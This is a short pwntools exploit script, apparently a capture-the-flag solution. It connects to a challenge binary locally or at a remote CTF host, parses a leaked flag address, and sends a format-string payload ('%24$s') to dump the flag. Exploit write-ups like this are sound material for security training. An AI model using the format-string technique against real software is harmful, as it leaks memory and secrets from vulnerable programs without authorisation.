#!/usr/bin/env python3

from pwn import *
import sys, struct
import getpass

# Start the process
elf = context.binary = ELF('../src/docker/binary_exploit')

def start():
    if args.REMOTE:
        return remote('atrhax-donnie-doggo.chals.io', 443, ssl=True)
    else:
        return process(elf.path)

p = start()


if not args.REMOTE:
    # Wait for user input incase you want to attach a debugger
    log.success('Binary Executed, Press Enter to continue')
    sys.stdin.read(1)

# Print the programs message
data = p.recvuntil(b'Please enter your password: ').decode('utf-8')
flag_addr = int(data.split('\n')[0][-8:], 16)
log.info('flag addr: %s' % hex(flag_addr))
p.sendline(b'%24$s')
log.success(p.recvall().decode('utf-8'))
